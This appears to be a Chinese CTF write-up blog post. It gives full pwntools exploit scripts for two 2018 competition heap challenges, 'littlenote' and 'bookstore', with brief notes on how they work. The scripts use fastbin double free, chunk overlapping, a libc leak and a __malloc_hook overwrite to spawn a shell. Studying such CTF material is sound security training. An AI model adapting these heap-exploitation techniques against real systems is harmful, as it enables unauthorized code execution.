<!--yml
category: 未分类
date: 2022-04-26 14:49:41
-->

# 信息安全铁人三项赛真题解析_对 [CrackMe] 【ctf】2018信息安全铁人三项赛个人赛总决赛赛题分享 的一些补充..._weixin_39587238的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_39587238/article/details/112805884](https://blog.csdn.net/weixin_39587238/article/details/112805884)

原贴主地址:https://www.52pojie.cn/thread-837939-1-1.html

littenote这道题的exp

#------------------------------------------------------------------------------------------------------------------------------------

from pwn import *

io=process('./littlenote')

#context(os='linux',arch='amd64',log_level='debug')

def add(content,choose):

io.sendline('1')

io.recvuntil('Enter your note\n')

io.send(content)

io.recvuntil('Want to keep your note?\n')

io.sendline(choose)

io.recvuntil('Done\n')

def show(index):

io.sendline('2')

io.recvuntil('Which note do you want to show?\n')

io.sendline(str(index))

return (io.recvuntil("\nDone\n"))[:-6]

def free(index):

io.sendline('3')

io.recvuntil('Which note do you want to delete?\n')

io.sendline(str(index))

io.recvuntil('Done\n')

def main():

add('\x00'*0x58+p64(0x71),'Y')

add('a','Y')

add((p64(0x0)+p64(0x21))*6,'Y')

free(1)

free(0)

free(1)

#pause()

heap_base=u64((show(0)).ljust(8,'\x00'))-0x70

print "heap_base -> " + hex(heap_base)

#pause()

add(p64(heap_base+0x60),'Y') # !

add('\x00'*0x58+p64(0x71),'Y')

add('\x00'*8+p64(0x81),'Y')

add('\x00'*8+p64(0xA1),'Y')

#pause()

free(1)

libc_base=u64((show(1)).ljust(8,'\x00'))-0x68-0x00000000003C4B10

print "libc_base -> " + hex(libc_base)

one_gadget=libc_base+0xf02a4 # change

print "one_gadget -> " + hex(one_gadget)

add('a','Y') # 7

add('a','Y') # 8

add('a','Y') # 9

free(7)

free(8)

free(7)

point=libc_base+0x3c4af5-8

add(p64(point),'Y') # 10

add('a','Y') # 11

add(p64(point),'Y') # 12

#pause()

add('a'*19+p64(one_gadget),'Y')

io.sendline('1')

io.interactive()

main()

#------------------------------------------------------------------------------------------------------------------------------------

这道题就是个chunk extend/overlapping,通过extend/overlapping来修改一些已经malloc的chunk的size域为small chunk而不属于fast chunk的范围,从而导致free该chunk的时候被放入unsorted bin,从而可以leak出libc地址跟计算出one_gadget的地址,进而修改fd指针指向__malloc_hook的附近的位置.从而控制程序执行流获得一个shell.

bookstore这道题有意思的多.

附上原帖贴主的exp

#------------------------------------------------------------------------------------------------------------------------------------

#!/usr/bin/env python

# -*- coding: UTF-8 -*-

# imports

from pwn import *

import time

import os

import sys

elf = ""

libc = ""

env = ""

LOCAL = 1

context.log_level = "debug"

p = process("./bookstore", env={"LD_PRELOAD":"/tmp/ironthree/book/libc_64.so"})

#p = remote("ip", port) #uncomment this.

p.recvuntil("choice:\n")

def add(name, length, book):

p.sendline("1")

p.recvuntil("name?\n")

p.send(name)

p.recvuntil("name?\n")

p.sendline(str(length))

p.recvuntil("book?\n")

p.send(book)

p.recvuntil("choice:\n")

def sell(idx):

p.sendline("2")

p.recvuntil("sell?\n")

p.sendline(str(idx))

p.recvuntil("choice:\n")

def read(idx):

p.sendline("3")

p.recvuntil("sell?\n")

p.sendline(str(idx))

data = p.recvuntil("choice:\n")

return data

add("1234567\n", 0, "a\n")

for i in range(4):

add("12345678\n", 0x50, "a\n")

add("aaaadddd\n", 0, "a\n") #7

add("bbbbcccc\n", 0x40, "a\n") #8

add("railser\n", 0, "b\n")

add("ddaa\n", 0x50, "b\n")

add("ddaa\n", 0x20, "b\n")

add("ddaa\n", 0x30, "b\n")

add("ddaa\n", 0x40, "b\n")

add("ddaa\n", 0x50, "b\n")

sell(0)

add("trytry\n", 0, "a" * 24 + p64(0xc1)+"\n") #overflow

sell(1)

add("a" * 16 + p64(0x6e)+"\n", 20, "x"*8+"\n")

data = read(1)

libc_addr = data.split("x"*8)[1][:6]

libc = u64(libc_addr + "\0\0") - 0x3c4c28

print hex(libc)

one = libc + 0x4526a

mallochook = libc + 0x3c4b10 - 0x10

target = libc + 0x3c4b38

#gogo

sell(5)

sell(6)

add("a"*30, 0, "a" * 24 + p64(0x51)+p64(0x6f)+"\n")

add("a"*30 ,0x40, "a\n")

sell(7)

sell(8)

add("a"*30, 0, "a"*24 + p64(0x61)+p64(target) + "\n")

add("a" * 30, 0x50, "a\n")

add("a"*30, 0x50, p64(0) * 6 + p64(mallochook) + "\n")

add("a"*30, 0x50, "a"*0x30+"\n")

add("a"*30, 0x50, p64(one) + "a"*0x30+"\n")

p.sendline("1")

p.sendline("xxxx")

p.sendline("30")

p.interactive()

#------------------------------------------------------------------------------------------------------------------------------------

拿到这道题我早就可以修改fd指针的.不过因为程序对malloc的大小有限制所以导致不知道下一步要怎么办,尝试过malloc 2 stack,不过stack上也没有合适的size,所以就卡住了,直到看到了原帖贴主的exp,他的思路是通过修改free的fast chunk的fd指针,从而可以控制fastbin来伪造size,进而可以修改别的free的chunk的fd来指向这个我们伪造的size,进而控制top chunk的指针,从而malloc 2 __malloc_hook,这种思路第一次看到!

至于myhouse这题,还没看...

有师傅学pwn的可以交流交流!

这几道题目可以在原帖下载!